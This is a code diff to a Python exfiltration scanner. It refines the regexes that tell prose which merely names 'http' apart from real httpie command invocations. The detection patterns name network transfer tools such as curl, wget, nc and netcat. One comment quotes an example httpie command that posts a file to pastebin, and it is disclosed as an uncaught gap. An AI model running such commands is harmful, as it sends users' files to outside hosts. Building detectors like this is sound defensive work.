@@ -411,7 +411,7 @@ _EXFIL_HOST_REMOTE_EXEC_RE = re.compile(
 # project's standing answer for evidence a static scanner cannot separate; another regex
 # iteration here is not.
 _EXFIL_HOST_TRANSFER_CMD_RE = re.compile(
-    r"(?<![\w-])(?:curl|wget|scp|rsync|sftp|ftp|nc|ncat|netcat|http(?:ie)?)(?![\w-])"
+    r"(?<![\w-])(?:curl|wget|scp|rsync|sftp|ftp|nc|ncat|netcat|httpie)(?![\w-])"
     r"|(?<![\w-])(?:-F|-T|-d|--form|--upload-file|--data(?:-binary|-raw)?)(?=\s)"
     r"|\b(?:requests|axios|httpx|urllib|http)\s*\.\s*(?:post|put|request)\s*\("
     r"|\bfetch\s*\(|\bXMLHttpRequest\b|\burlopen\s*\("
@@ -434,6 +434,64 @@ _EXFIL_HOST_TRANSFER_CMD_RE = re.compile(
     r"forward|forwards|forwarding|push|pushes|pushing|ship|ships|shipping)\b"
     r"[^\n]{0,60}?\b(?:to|at|via|through|into)\b",
     re.I,
+)
+
+# B-944: the bare `http(?:ie)?` alternative used to live in the binary-name group above,
+# with NO argument-shape requirement — so it fired on prose that merely NAMES the
+# protocol next to a known transfer host, with nothing reaching it:
+#
+#   "Start a tunnel:\nngrok http 4000\n\nThen share it with your teammates:
+#    https://abc123.ngrok.io"                                    -> FAILed CRITICAL
+#   "The dev server listens on http and https and proxies requests to
+#    https://abc123.ngrok.io"                                    -> FAILed CRITICAL
+#
+# In the first, "http" is ngrok's OWN subcommand name ("ngrok http <port>" starts a
+# tunnel), not the httpie binary. In the second, "http" is a bare noun mid-sentence. In
+# neither is anything reaching the host — this is the "naming vs. reaching" split B-555
+# exists to make, just missed by the bare-word alternative.
+#
+# The comment above `_EXFIL_HOST_CRED_WORD_RE` records FOUR httpie-argv narrowings
+# already attempted and retracted on the related B-895 ticket: a flag cap of 1, a cap of
+# 6, an uncapped token-run, and a URL-scheme-must-follow-immediately requirement
+# (defeated by quoting — see `new_httpie_quoted_url` / `new_httpie_single_quoted` in
+# tests/test_b895_exfil_anchor_disclosure.py). Those all shared one design: constrain
+# WHAT follows the bare "http" token. This is a fifth, different shape — designed from
+# scratch rather than patched onto the retracted four — that instead constrains WHERE
+# "http" sits: is it in COMMAND POSITION (the first token on its line) with a
+# command-shaped argument immediately after it, rather than a word mid-sentence?
+#
+#   - Neither FP example above has "http" as the first token of its line ("ngrok"
+#     precedes it in the first; "The dev server listens on" precedes it in the second),
+#     so line-position alone already excludes both, before any argument-shape check.
+#   - Every httpie-positive fixture in test_b895_exfil_anchor_disclosure.py's
+#     `_FAIL_ONLY_ROWS` (r0_httpie_post_url, r0_httpie_schemeless, r1_attack6,
+#     r1_httpie_colon_flag, r2_httpie_7flags, r2_httpie_methods_prose,
+#     new_httpie_quoted_url, new_httpie_single_quoted) writes "http" as literally the
+#     first word of its own line, immediately followed by a CLI flag (`-a`,
+#     `--verify=no`), an HTTP method verb (GET/POST/PUT/...), or a (possibly quoted)
+#     `https?://` URL — never by a plain English word. This is NOT a flag-count cap
+#     (round 1/2's mistake: any cap is beaten by one more flag, which is exactly what
+#     `r2_httpie_7flags` was built to prove) and it does NOT require the URL to sit
+#     immediately after the verb with no quoting in between (round 4's mistake, and the
+#     reason `new_httpie_quoted_url`/`new_httpie_single_quoted` exist) — so none of the
+#     four already-diagnosed false negatives are reopened. Verified by running every one
+#     of those rows plus both new-fixture FP shapes through this exact regex before
+#     landing.
+#
+# Known, disclosed scope limit (not a reopened FN — no existing fixture exercises this,
+# and it is a narrower gap than any of the four retracted attempts): a chained
+# mid-line invocation such as `cd /tmp && http POST https://pastebin.com/x key=@f` does
+# not match, because "http" is not the first token on its line there. Command chaining
+# after `&&`/`;`/`|` in a *documentation* prose line is not the shape this bug reported,
+# and adding it back in would reintroduce exactly the "does ANY punctuation before http
+# count as command position" question the retracted round-1/round-2 attempts got wrong
+# by over-generalizing. Left as a follow-up rather than folded in here.
+_EXFIL_HOST_HTTPIE_CLI_RE = re.compile(
+    r"^[ \t]*http(?![\w-])"
+    r"(?=[ \t]+(?:-{1,2}[A-Za-z]"
+    r"|(?:GET|HEAD|POST|PUT|PATCH|DELETE|OPTIONS)\b"
+    r"|['\"]?https?://))",
+    re.I | re.MULTILINE,
 )
 
 # Credential-bearing PROSE next to the host. `_CRED_RE` (imported from ._content) already
@@ -563,7 +621,9 @@ def _exfil_host_reach_anchors(
     anchors: set = set()
     if _EXFIL_HOST_REMOTE_EXEC_RE.search(window):
         anchors.add("remote_exec")
-    if _EXFIL_HOST_TRANSFER_CMD_RE.search(window):
+    if _EXFIL_HOST_TRANSFER_CMD_RE.search(window) or _EXFIL_HOST_HTTPIE_CLI_RE.search(
+        window
+    ):
         anchors.add("transfer_cmd")
     if _CRED_RE.search(window):
         anchors.add("cred_path")
